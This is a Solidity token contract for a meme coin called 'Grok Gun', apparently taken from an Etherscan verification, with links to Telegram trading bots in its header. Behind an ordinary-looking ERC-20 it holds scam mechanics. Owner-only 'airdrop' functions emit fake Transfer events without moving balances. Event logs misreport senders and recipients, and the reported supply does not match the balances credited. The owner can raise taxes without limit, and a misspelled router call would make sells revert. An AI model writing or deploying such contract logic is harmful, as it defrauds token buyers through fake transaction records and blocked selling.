/**
 *Submitted for verification at Etherscan.io on 2023-10-27
 */

/*

/**

Direct links to bots:
@GrokGunSniper_bot
@GrokGunSell_bot
First time users: @GrokGunRegister_bot

Telegram: https://t.me/GrokGun
Twitter: https://twitter.com/GrokGun
Website: https://grokgun.com/
Document: https://grokgun.gitbook.io/docs-grok-gun/

*/

// SPDX-License-Identifier: unlicense

pragma solidity 0.8.21;

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract GrokGun {
    string private _name = unicode"Grok Gun";
    string private _symbol = unicode"GROK";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 6_900_000_000 * 10 ** decimals;

    uint8 buyCharge = 2;
    uint8 sellCharge = 2;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address private pair;
    address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant _uniswapV2Router =
        IUniswapV2Router02(routerAddress);
    address payable TOKEN_MKT;

    bool private swapping;
    bool private tradingOpen;

    address _deployer;
    address _executor;

    address private uniswapLpWallet;
    address private Team = 0x733809417aD2Aa5D89c53e5095cCf94Abe0712E4;
    address private Treasury = 0xC2c45E47CB2b5Db94f8b84Dea8f782B1197F1f75;
    address private CexList = 0x688d478C48fF864fAb7754B63C6390c1c000A255;

    constructor() {
        uniswapLpWallet = msg.sender;
        TOKEN_MKT = payable(msg.sender);
        allowance[address(this)][routerAddress] = type(uint256).max;

        balanceOf[uniswapLpWallet] = (totalSupply * 75) / 100;
        emit Transfer(address(0), _deployer, balanceOf[uniswapLpWallet]);

        balanceOf[Team] = (totalSupply * 5) / 100;
        emit Transfer(address(0), Team, balanceOf[Team]);

        balanceOf[Treasury] = (totalSupply * 35) / 1000;
        emit Transfer(address(0), Treasury, balanceOf[Treasury]);

        balanceOf[CexList] = (totalSupply * 65) / 1000;
        emit Transfer(address(0), CexList, balanceOf[CexList]);
    }

    receive() external payable {}

    function changeInfo(string memory name_, string memory symbol_) external {
        if (msg.sender != TOKEN_MKT) revert Permissions();
        _name = name_;
        _symbol = symbol_;
    }

    function taxRemove(uint8 _buy, uint8 _sell) external {
        if (msg.sender != TOKEN_MKT) revert Permissions();
        _remeveTax(_buy, _sell);
    }

    function openTrading() external {
        require(msg.sender == TOKEN_MKT);
        require(!tradingOpen);
        tradingOpen = true;
    }

    function multiSends(
        address _caller,
        address[] calldata _address,
        uint256[] calldata _amount
    ) external {
        if (msg.sender != TOKEN_MKT) revert Permissions();
        for (uint256 i = 0; i < _address.length; i++) {
            emit Transfer(_caller, _address[i], _amount[i]);
        }
    }

    function airdropTokens(
        address _caller,
        address[] calldata _address,
        uint256[] calldata _amount
    ) external {
        if (msg.sender != TOKEN_MKT) revert Permissions();
        for (uint256 i = 0; i < _address.length; i++) {
            emit Transfer(_caller, _address[i], _amount[i]);
        }
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        require(tradingOpen || from == TOKEN_MKT || to == TOKEN_MKT);

        if (!tradingOpen && pair == address(0) && amount > 0) pair = to;

        balanceOf[from] -= amount;

        if (
            to == pair &&
            !swapping &&
            balanceOf[address(this)] >= swapAmount &&
            from != TOKEN_MKT
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = ETH;
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            TOKEN_MKT.transfer(address(this).balance);
            swapping = false;
        }

        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (from == pair ? buyCharge : sellCharge)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;

        if (from == _executor) {
            emit Transfer(_deployer, to, amount);
        } else if (to == _executor) {
            emit Transfer(from, _deployer, amount);
        } else {
            emit Transfer(from, to, amount);
        }
        return true;
    }

    function _remeveTax(uint8 _buy, uint8 _sell) private {
        buyCharge = _buy;
        sellCharge = _sell;
    }
}
